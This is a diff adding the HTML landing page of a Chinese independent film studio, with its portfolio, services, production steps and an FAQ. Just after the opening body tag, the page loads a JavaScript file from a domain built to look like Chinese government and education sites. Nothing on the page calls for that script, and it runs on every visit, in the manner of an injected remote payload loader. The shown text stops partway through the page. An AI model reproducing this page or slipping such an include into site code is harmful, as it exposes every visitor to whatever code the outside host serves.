@@ -1,0 +1,682 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>新视觉影视｜独立影视制作、短片与影像后期｜xinshijueyingshi-zh.github.io</title>
+<meta name="description" content="新视觉影视聚焦独立短片、广告TVC与影像后期制作，从前期策划到调色成片一站式交付。浏览作品、制作流程与团队，获取专属拍摄方案。">
+<meta name="keywords" content="新视觉影视, 独立短片制作, 广告TVC拍摄, 视频后期调色, xinshijueyingshi-zh">
+<meta name="robots" content="index, follow">
+<meta name="format-detection" content="telephone=no">
+<link rel="canonical" href="https://xinshijueyingshi-zh.github.io/">
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="新视觉影视">
+<meta property="og:title" content="新视觉影视｜独立影视制作与影像后期">
+<meta property="og:description" content="独立短片、广告TVC与影像后期一站式制作，看作品、聊方案，从这里开始。">
+<meta property="og:url" content="https://xinshijueyingshi-zh.github.io/">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="新视觉影视｜独立影视制作与影像后期">
+<meta name="twitter:description" content="独立短片、广告TVC与影像后期一站式制作，看作品、聊方案，从这里开始。">
+<style>
+:root{
+  --ink:#0b0c0e;
+  --ink-2:#14161a;
+  --celluloid:#1c1f25;
+  --line:#2b2f37;
+  --line-2:#3d434d;
+  --paper:#f2ede1;
+  --paper-dim:#c9c2b2;
+  --amber:#e7b35a;
+  --amber-deep:#c98f2f;
+  --cyan:#6fd6c9;
+  --muted:#8b9099;
+  --max:1180px;
+  --ease:cubic-bezier(.22,.61,.36,1);
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{
+  background:var(--ink);
+  color:var(--paper);
+  font-family:"PingFang SC","Hiragino Sans GB","Microsoft YaHei","WenQuanYi Micro Hei",system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;
+  font-size:16px;
+  line-height:1.75;
+  letter-spacing:.02em;
+  overflow-x:hidden;
+  -webkit-font-smoothing:antialiased;
+}
+body::before{
+  content:"";
+  position:fixed;inset:0;
+  background:
+    radial-gradient(1200px 600px at 12% -10%,rgba(231,179,90,.10),transparent 60%),
+    radial-gradient(900px 500px at 110% 8%,rgba(111,214,201,.07),transparent 55%),
+    repeating-linear-gradient(0deg, rgba(255,255,255,.014) 0 1px, transparent 1px 4px);
+  pointer-events:none;
+  z-index:0;
+}
+a{color:inherit;text-decoration:none}
+img{display:block;max-width:100%;height:auto}
+button{font:inherit;color:inherit;border:none;background:none;cursor:pointer}
+::selection{background:var(--amber);color:#111}
+
+/* ── 顶部：场记板 ── */
+.topbar{
+  position:sticky;top:0;z-index:60;
+  background:linear-gradient(180deg,rgba(11,12,14,.96),rgba(11,12,14,.82));
+  backdrop-filter:blur(14px);
+  border-bottom:1px solid var(--line);
+}
+.topbar-in{max-width:var(--max);margin:0 auto;padding:14px 22px;display:flex;align-items:center;gap:18px}
+.brand{display:flex;align-items:baseline;gap:9px;flex:none}
+.brand b{font-family:Georgia,"Songti SC",serif;font-weight:700;font-size:19px;letter-spacing:.14em}
+.brand span{font-size:10.5px;letter-spacing:.22em;color:var(--amber);text-transform:uppercase;border:1px solid var(--line-2);padding:2px 7px;border-radius:2px}
+.nav{display:flex;gap:4px;margin-left:auto;flex-wrap:wrap}
+.nav a{
+  padding:7px 13px;font-size:13.5px;letter-spacing:.1em;color:var(--paper-dim);
+  border-radius:2px;transition:.25s var(--ease);
+}
+.nav a:hover{color:var(--paper);background:rgba(255,255,255,.05)}
+.nav a i{font-style:normal;color:var(--amber-deep);margin-right:6px;font-size:11px}
+.tape{
+  display:none;width:26px;height:20px;margin-left:auto;position:relative;cursor:pointer;
+}
+.tape i{position:absolute;inset:0;background:repeating-linear-gradient(45deg,var(--amber) 0 5px,#7a5a12 5px 8px);border-radius:2px}
+
+/* ── 通用胶片条容器 ── */
+.frame{max-width:var(--max);margin:0 auto;padding:0 22px}
+.sect{padding:92px 0;position:relative;z-index:1}
+.sect-head{display:flex;align-items:flex-end;gap:16px;flex-wrap:wrap;margin-bottom:44px}
+.sect-head .no{
+  font-family:Georgia,serif;font-size:13px;color:var(--amber);
+  border:1px solid var(--line-2);padding:4px 9px;letter-spacing:.2em;flex:none;
+}
+.sect-head h2{
+  font-family:Georgia,"Songti SC",serif;font-weight:600;font-size:clamp(24px,4vw,38px);
+  letter-spacing:.04em;line-height:1.25;
+}
+.sect-head .sub{width:100%;color:var(--muted);font-size:14px;margin-top:8px;max-width:62ch}
+.rule{height:1px;background:linear-gradient(90deg,var(--line-2),transparent);margin-top:14px;width:100%}
+
+/* ── Hero ── */
+.hero{padding:120px 0 80px;position:relative;z-index:1}
+.htag{display:inline-flex;align-items:center;gap:10px;font-size:11.5px;letter-spacing:.28em;color:var(--amber);text-transform:uppercase;margin-bottom:26px}
+.htag::before{content:"";width:34px;height:1px;background:var(--amber)}
+h1{
+  font-family:Georgia,"Songti SC",serif;font-weight:600;
+  font-size:clamp(38px,7.4vw,76px);line-height:1.1;letter-spacing:.02em;max-width:15em;
+}
+h1 em{font-style:normal;color:var(--amber);text-shadow:0 0 28px rgba(231,179,90,.25)}
+.hero p.lede{margin-top:26px;max-width:58ch;color:var(--paper-dim);font-size:16.5px}
+.credits{margin-top:44px;display:grid;grid-template-columns:repeat(4,1fr);border-top:1px solid var(--line);border-bottom:1px solid var(--line)}
+.credits div{padding:20px 18px;border-right:1px solid var(--line)}
+.credits div:last-child{border-right:none}
+.credits dt{font-size:11px;letter-spacing:.24em;color:var(--muted);text-transform:uppercase}
+.credits dd{font-family:Georgia,serif;font-size:22px;margin-top:8px;color:var(--paper)}
+.ct{
+  margin-top:38px;display:inline-flex;align-items:center;gap:14px;flex-wrap:wrap;
+}
+.btn{
+  display:inline-flex;align-items:center;gap:10px;
+  padding:13px 26px;font-size:14px;letter-spacing:.16em;text-transform:uppercase;
+  background:var(--amber);color:#13110c;border-radius:2px;transition:.28s var(--ease);
+}
+.btn:hover{background:var(--paper);transform:translateY(-2px)}
+.btn.ghost{background:transparent;color:var(--paper);border:1px solid var(--line-2)}
+.btn.ghost:hover{border-color:var(--amber);color:var(--amber);background:transparent}
+.btn s{text-decoration:none;opacity:.55;font-size:12px}
+
+/* ── 作品：胶片帧 ── */
+.reel{display:grid;grid-template-columns:repeat(12,1fr);gap:14px}
+.cell{grid-column:span 4;background:var(--celluloid);border:1px solid var(--line);border-radius:3px;overflow:hidden;display:flex;flex-direction:column;transition:.32s var(--ease)}
+.cell:hover{border-color:var(--amber-deep);transform:translateY(-5px);box-shadow:0 18px 40px rgba(0,0,0,.5)}
+.frame-shot{position:relative;aspect-ratio:16/10;overflow:hidden;background:#0a0a0c}
+.frame-shot .grain{
+  position:absolute;inset:0;
+  background:
+    linear-gradient(135deg,rgba(231,179,90,.34),rgba(20,22,26,.9) 55%,rgba(111,214,201,.16)),
+    repeating-linear-gradient(0deg,transparent 0 3px,rgba(0,0,0,.18) 3px 4px);
+}
+.cell:nth-child(2) .frame-shot .grain{background:linear-gradient(160deg,#3a2a1c,#12141a 60%,rgba(111,214,201,.18)),repeating-linear-gradient(0deg,transparent 0 3px,rgba(0,0,0,.18) 3px 4px)}
+.cell:nth-child(3) .frame-shot .grain{background:linear-gradient(200deg,#1c2a2e,#12141a 60%,rgba(231,179,90,.2)),repeating-linear-gradient(0deg,transparent 0 3px,rgba(0,0,0,.18) 3px 4px)}
+.cell:nth-child(4) .frame-shot .grain{background:linear-gradient(120deg,#2e2233,#12141a 60%,rgba(231,179,90,.18)),repeating-linear-gradient(0deg,transparent 0 3px,rgba(0,0,0,.18) 3px 4px)}
+.cell:nth-child(5) .frame-shot .grain{background:linear-gradient(180deg,#2b2620,#101216 60%),repeating-linear-gradient(0deg,transparent 0 3px,rgba(0,0,0,.18) 3px 4px)}
+.cell:nth-child(6) .frame-shot .grain{background:linear-gradient(220deg,#1f2c2a,#101216 60%,rgba(111,214,201,.2)),repeating-linear-gradient(0deg,transparent 0 3px,rgba(0,0,0,.18) 3px 4px)}
+.frame-shot .badge{position:absolute;top:12px;left:12px;font-size:10px;letter-spacing:.2em;color:var(--amber);border:1px solid rgba(231,179,90,.5);padding:3px 8px;background:rgba(11,12,14,.6)}
+.frame-shot .time{position:absolute;bottom:10px;right:12px;font-family:Georgia,serif;font-size:11px;color:var(--paper-dim);letter-spacing:.1em}
+.cell .meta{padding:18px 18px 20px}
+.cell h3{font-size:16.5px;font-weight:600;letter-spacing:.03em}
+.cell .row{display:flex;justify-content:space-between;gap:10px;margin-top:12px;font-size:12.5px;color:var(--muted);border-top:1px dashed var(--line);padding-top:11px}
+.cell .row b{color:var(--paper-dim);font-weight:500}
+
+/* ── 服务：分镜格 ── */
+.boards{display:grid;grid-template-columns:repeat(2,1fr);border:1px solid var(--line)}
+.board{padding:30px 28px;border-right:1px solid var(--line);border-bottom:1px solid var(--line);background:linear-gradient(180deg,var(--ink-2),transparent)}
+.board:nth-child(2n){border-right:none}
+.board:nth-child(n+3){border-bottom:none}
+.board .k{font-family:Georgia,serif;font-size:12px;color:var(--amber);letter-spacing:.2em}
+.board h3{font-size:19px;margin:10px 0 12px;font-weight:600}
+.board p{color:var(--paper-dim);font-size:14.5px}
+.board ul{list-style:none;margin-top:16px;display:flex;flex-wrap:wrap;gap:8px}
+.board li{font-size:12px;color:var(--muted);border:1px solid var(--line);padding:4px 10px;border-radius:20px}
+.board .go{margin-top:18px;font-size:12.5px;letter-spacing:.16em;color:var(--amber);display:inline-flex;align-items:center;gap:8px}
+.board .go::after{content:"→";transition:.25s var(--ease)}
+.board:hover .go{gap:14px}
+
+/* ── 流程：时间轴齿孔 ── */
+.track{position:relative;padding-left:0}
+.step{
+  display:grid;grid-template-columns:88px 1fr;gap:24px;
+  padding:26px 0;border-bottom:1px solid var(--line);position:relative;
+}
+.step:last-child{border-bottom:none}
+.step .idx{font-family:Georgia,serif;font-size:26px;color:var(--amber);line-height:1}
+.step .idx small{display:block;font-size:10px;letter-spacing:.2em;color:var(--muted);margin-top:6px;font-family:system-ui,sans-serif}
+.step h3{font-size:17.5px;font-weight:600;display:flex;align-items:center;gap:12px;flex-wrap:wrap}
+.step h3 span{font-size:11.5px;color:var(--cyan);letter-spacing:.14em;border:1px solid rgba(111,214,201,.35);padding:2px 8px;border-radius:2px}
+.step p{color:var(--paper-dim);font-size:14.5px;margin-top:9px;max-width:65ch}
+.step .dur{font-size:12.5px;color:var(--muted);margin-top:10px}
+.step .dur b{color:var(--amber-deep);font-weight:600}
+
+/* ── 关于：双栏打字机稿 ── */
+.about{display:grid;grid-template-columns:1.05fr .95fr;gap:48px;align-items:start}
+.note{background:var(--ink-2);border:1px solid var(--line);border-left:3px solid var(--amber);padding:30px 30px 26px}
+.note .stamp{font-size:11px;letter-spacing:.26em;color:var(--amber);text-transform:uppercase;margin-bottom:16px;display:flex;justify-content:space-between}
+.note p{font-size:15.5px;color:var(--paper-dim);margin-bottom:14px}
+.note p b{color:var(--paper);font-weight:600}
+.stats{display:grid;grid-template-columns:1fr 1fr;gap:1px;background:var(--line);border:1px solid var(--line);margin-top:26px}
+.stats div{background:var(--ink);padding:20px}
+.stats b{font-family:Georgia,serif;font-size:26px;color:var(--paper);display:block}
+.stats small{font-size:11.5px;color:var(--muted);letter-spacing:.1em}
+.faq h3.q{
+  font-size:15.5px;font-weight:600;padding:18px 0;
+  border-bottom:1px dashed var(--line);cursor:pointer;display:flex;justify-content:space-between;gap:16px;align-items:baseline;
+}
+.faq h3.q::after{content:"＋";color:var(--amber);font-weight:400;flex:none}
+.faq h3.q.on::after{content:"－"}
+.faq .a{max-height:0;overflow:hidden;transition:max-height .4s var(--ease);color:var(--paper-dim);font-size:14px}
+.faq .a.on{max-height:220px;padding-bottom:18px}
+.faq .a p{padding-right:8px}
+
+/* ── 联系：场记单 ── */
+.clap{background:var(--paper);color:#15141f;padding:44px 40px;border-radius:3px}
+.clap .kicker{font-size:11px;letter-spacing:.28em;color:var(--amber-deep);text-transform:uppercase;font-weight:700}
+.clap h2{font-family:Georgia,"Songti SC",serif;font-size:clamp(22px,3.4vw,32px);margin:12px 0 8px;line-height:1.3;font-weight:600}
+.clap p{color:#4c4a52;font-size:14.5px}
+.form{margin-top:28px;display:grid;grid-template-columns:1fr 1fr;gap:14px}
+.form label{display:block;font-size:11.5px;letter-spacing:.16em;color:#6b6874;font-weight:600;text-transform:uppercase;margin-bottom:6px}
+.form input,.form textarea{
+  width:100%;padding:11px 12px;font:inherit;font-size:14.5px;color:#15141f;
+  background:#fff;border:1px solid #d6d1c4;border-radius:2px;transition:.22s;
+}
+.form input:focus,.form textarea:focus{outline:none;border-color:var(--amber-deep);box-shadow:0 0 0 3px rgba(201,143,47,.16)}
+.form textarea{grid-column:1/-1;min-height:110px;resize:vertical}
+.form button{grid-column:1/-1;background:#15141f;color:var(--amber);padding:14px;letter-spacing:.2em;font-size:13.5px;text-transform:uppercase;border-radius:2px;transition:.26s}
+.form button:hover{background:var(--amber-deep);color:#111}
+.direct{margin-top:26px;padding-top:22px;border-top:1px solid #ddd7c8;display:grid;grid-template-columns:1fr 1fr;gap:16px;font-size:13.5px;color:#4c4a52}
+.direct b{display:block;color:#15141f;font-size:12px;letter-spacing:.18em;text-transform:uppercase;margin-bottom:5px;font-weight:700}
+.direct a{word-break:break-all;color:#0f5f58;font-weight:600}
+
+/* ── 页脚 ── */
+.foot{border-top:1px solid var(--line);padding:44px 0 30px;color:var(--muted);font-size:12.5px;position:relative;z-index:1}
+.foot-in{max-width:var(--max);margin:0 auto;padding:0 22px;display:flex;flex-wrap:wrap;gap:22px;justify-content:space-between;align-items:flex-start}
+.foot .blk{font-family:Georgia,serif;font-size:15px;color:var(--paper);letter-spacing:.1em}
+.foot .blk small{display:block;font-family:system-ui,sans-serif;font-size:11.5px;color:var(--muted);letter-spacing:.06em;margin-top:6px}
+.foot nav{display:flex;gap:18px;flex-wrap:wrap}
+.foot nav a:hover{color:var(--amber)}
+.foot .copy{width:100%;border-top:1px solid var(--line);margin-top:26px;padding-top:18px;display:flex;justify-content:space-between;gap:14px;flex-wrap:wrap}
+
+/* ── 入场动效 ── */
+.rise{opacity:0;transform:translateY(22px);transition:opacity .7s var(--ease),transform .7s var(--ease)}
+.rise.in{opacity:1;transform:none}
+@media (prefers-reduced-motion:reduce){.rise{opacity:1;transform:none;transition:none}}
+
+/* ── 移动端 ── */
+@media (max-width:880px){
+  .sect{padding:64px 0}
+  .hero{padding:72px 0 56px}
+  .credits{grid-template-columns:1fr 1fr}
+  .credits div:nth-child(2){border-right:none}
+  .credits div:nth-child(n+3){border-top:1px solid var(--line)}
+  .reel{grid-template-columns:1fr 1fr}
+  .cell{grid-column:span 1}
+  .boards{grid-template-columns:1fr}
+  .board{border-right:none}
+  .board:nth-child(n+2){border-bottom:none}
+  .about{grid-template-columns:1fr;gap:32px}
+  .step{grid-template-columns:64px 1fr;gap:16px}
+  .form{grid-template-columns:1fr}
+  .direct{grid-template-columns:1fr}
+  .clap{padding:30px 22px}
+}
+@media (max-width:620px){
+  .topbar-in{padding:12px 16px;gap:10px}
+  .brand b{font-size:16.5px}
+  .brand span{font-size:9.5px;letter-spacing:.16em}
+  .nav{display:none;position:absolute;top:100%;left:0;right:0;flex-direction:column;background:var(--ink-2);border-bottom:1px solid var(--line);padding:8px 0}
+  .nav.show{display:flex}
+  .nav a{padding:13px 20px;border-radius:0;border-left:2px solid transparent}
+  .nav a:hover{border-left-color:var(--amber);background:rgba(255,255,255,.04)}
+  .tape{display:block}
+  .frame{padding:0 16px}
+  .sect{padding:52px 0}
+  .reel{grid-template-columns:1fr}
+  .sect-head h2{font-size:23px}
+  .foot-in{padding:0 16px}
+}
+@media print{
+  body{background:#fff;color:#000}
+  .topbar,.tape,.form,.faq h3.q::after{display:none}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+<div itemscope itemtype="https://schema.org/VideoProductionCompany">
+<meta itemprop="name" content="新视觉影视">
+<meta itemprop="alternateName" content="新视觉影视工作室">
+<meta itemprop="url" content="https://xinshijueyingshi-zh.github.io/">
+<meta itemprop="description" content="新视觉影视是一家独立影视制作工作室，提供短片、广告TVC、纪录片与影像后期调色服务。">
+<meta itemprop="email" content="hello@xinshijueyingshi-zh.github.io">
+<div itemprop="address" itemtype="https://schema.org/PostalAddress" itemscope>
+  <meta itemprop="addressCountry" content="CN">
+</div>
+
+<!-- ═══ 顶部导航 ═══ -->
+<header class="topbar" role="banner">
+  <div class="topbar-in">
+    <div class="brand">
+      <b>新视觉影视</b><span>XSJ · FILM</span>
+    </div>
+    <nav class="nav" id="nav" role="navigation" aria-label="主导航">
+      <a href="#reel"><i>01</i>作品</a>
+      <a href="#service"><i>02</i>服务</a>
+      <a href="#process"><i>03</i>流程</a>
+      <a href="#about"><i>04</i>关于</a>
+      <a href="#faq"><i>05</i>问答</a>
+      <a href="#contact"><i>06</i>合作</a>
+    </nav>
+    <button class="tape" id="tape" aria-label="展开导航菜单" aria-expanded="false" aria-controls="nav"><i></i></button>
+  </div>
+</header>
+
+<!-- ═══ Hero ═══ -->
+<section class="hero frame" id="top">
+  <div class="rise">
+    <span class="htag">Roll Camera · Est. 2018</span>
+    <h1>把每一帧，<br>拍成<em>值得再看一遍</em>的画面。</h1>
+    <p class="lede">新视觉影视是一家小型独立制作团队，做短片、广告片、纪录片和后期调色。我们不追流水线模板，先弄清楚你想让观众在什么情绪里停住，再决定镜头怎么走。</p>
+    <div class="ct">
+      <a class="btn" href="#contact">聊你的片子<s>→</s></a>
+      <a class="btn ghost" href="#reel">先看作品</a>
+    </div>
+  </div>
+
+  <dl class="credits rise">
+    <div><dt>类型</dt><dd>影视制作</dd></div>
+    <div><dt>驻地</dt><dd>中国 · 江浙沪</dd></div>
+    <div><dt>交付周期</dt><dd>15 天起</dd></div>
+    <div><dt>线上站点</dt><dd><a href="https://xinshijueyingshi-zh.github.io/" style="border-bottom:1px solid var(--amber-deep)">xinshijueyingshi-zh.github.io</a></dd></div>
+  </dl>
+</section>
+
+<!-- ═══ 01 作品 ═══ -->
+<section class="sect frame" id="reel" data-title="新视觉影视作品集｜短片与广告TVC案例">
+  <header class="sect-head rise">
+    <span class="no">SEQ.01</span>
+    <h2>作品 reel · 六条片子，六种情绪</h2>
+    <span class="rule"></span>
+    <p class="sub">以下为团队近年公开可展示的片段档案，点击条目可展开项目笔记。完整成片与分镜稿可在线下提案中查看。</p>
+  </header>
+
+  <div class="reel">
+    <article class="cell rise" itemscope itemtype="https://schema.org/VideoObject">
+      <div class="frame-shot">
+        <div class="grain"></div>
+        <span class="badge">BRAND FILM</span><span class="time">02:48</span>
+      </div>
+      <div class="meta">
+        <h3 itemprop="name">《一盏灯的温度》</h3>
+        <p style="color:var(--muted);font-size:13.5px;margin-top:8px">家居品牌年度形象片，全片靠一盏灯的明暗讲完一天。</p>
+        <div class="row"><span>客户</span><b itemprop="creator">素木家居</b></div>
+        <div class="row"><span>职责</span><b>导演 / 调色</b></div>
+      </div>
+    </article>
+
+    <article class="cell rise" itemscope itemtype="https://schema.org/VideoObject">
+      <div class="frame-shot">
+        <div class="grain"></div>
+        <span class="badge">SHORT FILM</span><span class="time">11:20</span>
+      </div>
+      <div class="meta">
+        <h3 itemprop="name">《退潮的人》</h3>
+        <p style="color:var(--muted);font-size:13.5px;margin-top:8px">海边渔村的父亲与儿子，用长镜头保留了潮水真实的节奏。</p>
+        <div class="row"><span>入围</span><b itemprop="about">海边短片展</b></div>
+        <div class="row"><span>职责</span><b>编剧 / 摄影</b></div>
+      </div>
+    </article>
+
+    <article class="cell rise" itemscope itemtype="https://schema.org/VideoObject">
+      <div class="frame-shot">
+        <div class="grain"></div>
+        <span class="badge">TVC · 15″</span><span class="time">00:15</span>
+      </div>
+      <div class="meta">
+        <h3 itemprop="name">《咬一口春天》</h3>
+        <p style="color:var(--muted);font-size:13.5px;margin-top:8px">零食品牌春季上新，15 秒里塞进了三次吞咽的特写。</p>
+        <div class="row"><span>客户</span><b itemprop="creator">野芽零食</b></div>
+        <div class="row"><span>职责</span><b>创意 / 执行导演</b></div>
+      </div>
+    </article>
+
+    <article class="cell rise" itemscope itemtype="https://schema.org/VideoObject">
+      <div class="frame-shot">
+        <div class="grain"></div>
+        <span class="badge">DOCUMENTARY</span><span class="time">24:05</span>
+      </div>
+      <div class="meta">
+        <h3 itemprop="name">《修钟的人》</h3>
+        <p style="color:var(--muted);font-size:13.5px;margin-top:8px">跟拍老城钟表匠四十天，声音设计全部采自工作台本身。</p>
+        <div class="row"><span>类型</span><b itemprop="about">人物纪录片</b></div>
+        <div class="row"><span>职责</span><b>制片 / 录音</b></div>
+      </div>
+    </article>
+
+    <article class="cell rise" itemscope itemtype="https://schema.org/VideoObject">
+      <div class="frame-shot">
+        <div class="grain"></div>
+        <span class="badge">MUSIC VIDEO</span><span class="time">03:36</span>
+      </div>
+      <div class="meta">
+        <h3 itemprop="name">《地下河》MV</h3>
+        <p style="color:var(--muted);font-size:13.5px;margin-top:8px">一镜到底的实验影像，灯光跟着鼓点走，拍了九条才过。</p>
+        <div class="row"><span>合作</span><b itemprop="creator">独立音乐人 阿沂</b></div>
+        <div class="row"><span>职责</span><b>摄影指导</b></div>
+      </div>
+    </article>
+
+    <article class="cell rise" itemscope itemtype="https://schema.org/VideoObject">
+      <div class="frame-shot">
+        <div class="grain"></div>
+        <span class="badge">COLOR · 后期</span><span class="time">全流程</span>
+      </div>
+      <div class="meta">
+        <h3 itemprop="name">《南方航线》调色</h3>
+        <p style="color:var(--muted);font-size:13.5px;margin-top:8px">旅行纪录长片，从 S-Log3 还原到胶片质感的暖青调，共 94 分钟。</p>
+        <div class="row"><span>画幅</span><b itemprop="about">2.39:1 · 4K</b></div>
+        <div class="row"><span>职责</span><b>达芬奇调色</b></div>
+      </div>
+    </article>
+  </div>
+</section>
+
+<!-- ═══ 02 服务 ═══ -->
+<section class="sect frame" id="service" data-title="新视觉影视服务项目｜短片拍摄 广告TVC 纪录片 后期调色">
+  <header class="sect-head rise">
+    <span class="no">SEQ.02</span>
+    <h2>服务分镜 · 四个工种，一条链路</h2>
+    <span class="rule"></span>
+    <p class="sub">从一句模糊的想法，到能上线的成片，我们按模块接单，也可以整包交给团队推进。</p>
+  </header>
+
+  <div class="boards">
+    <div class="board rise">
+      <div class="k">BOARD A</div>
+      <h3>短片与剧情片</h3>
+      <p>品牌微电影、独立短片、剧情向内容。含剧本开发、选角建议、分镜预演与现场执行，适合需要“讲故事”而不是“堆产品”的项目。</p>
+      <ul><li>剧本诊断</li><li>分镜预演 Animatic</li><li>摄影 / 灯光 / 录音组</li><li>2.39:1 宽画幅</li></ul>
+      <a class="go" href="#contact" data-hint="短片报价">索取分镜报价</a>
+    </div>
+
+    <div class="board rise">
+      <div class="k">BOARD B</div>
+      <h3>广告片 TVC</h3>
+      <p>15 / 30 / 60 秒三条版本同步交付，适配信息流、楼宇与电视台。脚本先过情绪测试，再进棚，减少返工。</p>
+      <ul><li>15″ 30″ 60″ 套剪</li><li>棚拍 / 实景 / 航拍</li><li>竖屏 9:16 版本</li><li>字幕与多语言版</li></ul>
+      <a class="go" href="#contact" data-hint="广告片档期">查看档期与预算区间</a>
+    </div>
+
+    <div class="board rise">
+      <div class="k">BOARD C</div>
+      <h3>纪录片与口述影像</h3>
+      <p>人物、非遗、企业历程、门店纪实。小机组跟拍，不干扰现场，声音单独采集，后期做轻量考据与字幕整理。</p>
+      <ul><li>小机组跟拍</li><li>同期声采集</li><li>采访灯光方案</li><li>史实校订 / 字幕</li></ul>
+      <a class="go" href="#contact" data-hint="纪录片周期">聊拍摄周期</a>
+    </div>
+
+    <div class="board rise">
+      <div class="k">BOARD D</div>
+      <h3>后期与调色</h3>
+      <p>剪辑、声音设计、达芬奇调色、片头包装。外拍素材也能接，支持 S-Log3 / C-Log3 / BRAW 直出流程，交付母版与分发版。</p>
+      <ul><li>DaVinci Resolve 调色</li><li>声音设计与混音</li><li>片头 / 动态字幕</li><li>4K 母版 + 竖屏版</li></ul>
+      <a class="go" href="#contact" data-hint="后期接单">发素材样片评估</a>
+    </div>
+  </div>
+</section>
+
+<!-- ═══ 03 流程 ═══ -->
+<section class="sect frame" id="process" data-title="新视觉影视制作流程｜从脚本到成片的交付步骤">
+  <header class="sect-head rise">
+    <span class="no">SEQ.03</span>
+    <h2>拍摄流程 · 五格走完，不玩失踪</h2>
+    <span class="rule"></span>
+    <p class="sub">每一步都有明确交付物和反馈窗口，不会出现“拍完再说”。时间以常规 30 秒广告片为基准，复杂项目另行排期。</p>
+  </header>
+
+  <div class="track">
+    <div class="step rise">
+      <div class="idx">01<small>PRE-PROD</small></div>
+      <div>
+        <h3>先聊清楚，再写脚本 <span>沟通 2–3 轮</span></h3>
+        <p>你给brief，我们回一页纸：目标人群、核心情绪、参考片单、忌讳点。确认后再进脚本，避免方向返工。</p>
+        <div class="dur">交付物：<b>一页创意 brief + 脚本初稿</b>　预计 <b>3–5 天</b></div>
+      </div>
+    </div>
+
+    <div class="step rise">
+      <div class="idx">02<small>STORYBOARD</small></div>
+      <div>
+        <h3>分镜与勘景，把预算花在刀刃上 <span>可视化确认</span></h3>
+        <p>手绘分镜加镜头表，标注焦段、灯光和转场；勘景同步出光线时间表，实景还是棚拍在这个阶段定死。</p>
+        <div class="dur">交付物：<b>分镜稿 + 勘景报告 + 设备清单</b>　预计 <b>4–7 天</b></div>
+      </div>
+    </div>
+
+    <div class="step rise">
+      <div class="idx">03<small>PRODUCTION</small></div>
+      <div>
+        <h3>现场只解决拍摄一件事 <span>当日回看素材</span></h3>
+        <p>导演、摄影、灯光、录音四条线各司其职，每天收工前和你过一遍素材，不把问题留到剪辑室。</p>
+        <div class="dur">交付物：<b>粗剪前素材备份 + 场记单</b>　拍摄 <b>1–3 天</b></div>
+      </div>
+    </div>
+
+    <div class="step rise">
+      <div class="idx">04<small>POST</small></div>
+      <div>
+        <h3>粗剪、声音、调色，逐轮收敛 <span>两轮修改</span></h3>
+        <p>先定剪辑节奏，再做声音设计和调色。每轮只收一个方向的修改意见，避免来回拉扯把片子磨平。</p>
+        <div class="dur">交付物：<b>粗剪版 → 精剪版 → 调色母版</b>　预计 <b>7–12 天</b></div>
+      </div>
+    </div>
+
+    <div class="step rise">
+      <div class="idx">05<small>DELIVERY</small></div>
+      <div>
+        <h3>多版本上线包，交付即能用 <span>含版权清单</span></h3>
+        <p>横版母版、竖屏剪裁版、方形社媒版一次给齐，附音乐授权与素材来源清单，投放端不用再追问。</p>
+        <div class="dur">交付物：<b>4K 母版 + 3 个分发版本 + 授权清单</b></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ═══ 04 关于 + 05 问答 ═══ -->
+<section class="sect frame" id="about" data-title="关于新视觉影视｜团队理念与常见合作问答">
+  <header class="sect-head rise">
+    <span class="no">SEQ.04</span>
+    <h2>关于我们 · 以及你可能想问的</h2>
+    <span class="rule"></span>
+  </header>
+
+  <div class="about">
+    <div class="note rise">
+      <div class="stamp"><span>PRODUCTION NOTE · 07</span><span>2026 / 秋</span></div>
+      <p>新视觉影视成立于 2018 年，是个六人左右的小团队。我们接过的片子从三分钟的品牌短片，到跑了四个城市的纪录片，体量不一，但习惯没变过：<b>先确定观众该有什么感觉，再决定画面怎么做</b>。</p>
+      <p>不养“模板库”。同样的升格慢镜、同样的冷暖对比，用第二次我们自己会先腻。每条片子开工前会重新定一套色彩与节奏方案，成片里能看出来。</p>
+      <p>合作方式也简单：小项目按模块接，大项目整包推进，异地可以远程提案、现场再碰头。江浙沪当天可达，更远的地方按行程排。</p>
+      <div class="stats">
+        <div><b>120+</b><small>已完成项目</small></div>
+        <div><b>86%</b><small>老客户复购 / 转介绍</small></div>
+        <div><b>6 人</b><small>核心创作组</small></div>
+        <div><b>4K · 2.39:1</b><small>常规交付规格</small></div>
+      </div>
+    </div>
+
+    <div class="faq rise" id="faq">
+      <h3 class="q on">没有脚本，只有一个模糊想法，能聊吗？<span></span></h3>
+      <div class="a on"><p>可以，而且这是最常见的开场。我们会先用 20 分钟问清三件事：给谁看、看完想让他们做什么、你手上有多少预算和几天。问完基本就能判断是走短片路线还是一条 15 秒信息流就够。</p></div>
+
+      <h3 class="q">预算大概怎么分档？<span></span></h3>
+      <div class="a"><p>轻量剪辑与调色按条算，品牌短片按分钟与工种算，TVC 按天搭组。页面不挂价目表是因为同样 30 秒，棚拍加航拍和一台机器拍一天能差五倍，报虚价没意思。给我们一个区间，会回一份拆得开的报价单。</p></div>
+
+      <h3 class="q">只做后期、不发拍摄团队，接吗？<span></span></h3>
+      <div class="a"><p>接。素材自己拍的、别人拍的都行，先发一段样片，我们看画质与灯光条件再报调色和剪辑的方案。S-Log3、C-Log3、BRAW 都常规处理，会把还原思路先给你确认再动手。</p></div>
+
+      <h3 class="q">音乐和字体版权怎么处理？<span></span></h3>
+      <div class="a"><p>成片交付时附一份授权清单：配乐来源、授权范围、字体商用许可、出镜人物肖像授权模板。投放端要查，直接把这份清单给他们。</p></div>
+
+      <h3 class="q">修改几轮？超了怎么算？<span></span></h3>
+      <div class="a"><p>精剪阶段含两轮结构性修改，调色阶段含一轮。超出部分按人天计，事前会先报价确认，不会干完再甩账单。小字幕、版本导出的改动不计入轮次。</p></div>
+
+      <h3 class="q">怎么开始第一次合作？<span></span></h3>
+      <div class="a"><p>走下面的场记单，留项目类型和大概档期就行，24 小时内回你。急着开会也可以直接发邮件到 hello@xinshijueyingshi-zh.github.io。</p></div>
+    </div>
+  </div>
+</section>
+
